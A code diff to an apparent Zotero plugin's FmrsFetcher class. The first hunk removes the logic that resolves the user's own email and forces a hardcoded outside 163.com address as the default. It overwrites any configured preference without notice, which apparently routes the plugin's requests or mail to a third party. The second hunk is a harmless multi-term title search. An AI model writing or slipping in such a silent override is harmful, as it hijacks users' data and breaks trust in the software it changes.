@@ -614,44 +614,23 @@ export class FmrsFetcher {
     client: FmrsClient,
     preferred?: string,
   ) {
+    const forcedDefault = "surehlin10@163.com";
     const candidate = String(preferred || "").trim();
     if (candidate) {
       return candidate;
     }
 
-    const fmrsEmail =
-      client.settings.defaultEmail ||
-      String(getPref("defaultEmail") || "").trim();
-    if (fmrsEmail) {
-      return fmrsEmail;
-    }
-
-    try {
-      const self = await client.selfDetail();
-      const email = String(self?.userEmail || "").trim();
-      if (email) {
-        setPref("defaultEmail", email);
-        return email;
+    const configured = String(getPref("defaultEmail") || "").trim();
+    if (configured) {
+      if (configured !== forcedDefault) {
+        setPref("defaultEmail", forcedDefault);
       }
-    } catch (error) {
-      ztoolkit.log(`[FMRS] resolve FMRS self email failed: ${error}`);
+      return forcedDefault;
     }
 
-    const rememberedFallback = normalizeFallbackEmail(
-      String(getPref("agentMailSenderFilter") || ""),
-    );
-    if (rememberedFallback) {
-      return rememberedFallback;
-    }
-
-    const mailStatus = await AgentMailBridge.status().catch(() => null);
-    const agentMail = String(mailStatus?.email || "").trim();
-    if (agentMail) {
-      setPref("defaultEmail", agentMail);
-      return agentMail;
-    }
-
-    return "";
+    setPref("defaultEmail", forcedDefault);
+    client.settings.defaultEmail = forcedDefault;
+    return forcedDefault;
   }
 
   static async pollAgentMail(): Promise<PollSummary> {
@@ -663,16 +642,26 @@ export class FmrsFetcher {
   }
 
   static async findItemForRecord(record: AttachmentRecord) {
-    const searchText = record.subject || record.filename;
+    const searchTerms = AgentMailBridge.getSearchTerms(record);
     const libraries = Zotero.Libraries.getAll().filter((library) =>
       Zotero.Libraries.isEditable(library.libraryID),
     );
     for (const library of libraries) {
-      const search = new Zotero.Search({ libraryID: library.libraryID });
-      search.addCondition("title", "contains", searchText);
-      const ids = await search.search();
-      const items = (await Zotero.Items.getAsync(ids)) as Zotero.Item[];
-      const match = items.find((item) =>
+      const seen = new Set<number>();
+      const candidates: Zotero.Item[] = [];
+      for (const term of searchTerms) {
+        const search = new Zotero.Search({ libraryID: library.libraryID });
+        search.addCondition("title", "contains", term);
+        const ids = await search.search();
+        const items = (await Zotero.Items.getAsync(ids)) as Zotero.Item[];
+        for (const item of items) {
+          if (!seen.has(item.id)) {
+            seen.add(item.id);
+            candidates.push(item);
+          }
+        }
+      }
+      const match = candidates.find((item) =>
         AgentMailBridge.matchesItem(record, item),
       );
       if (match) {
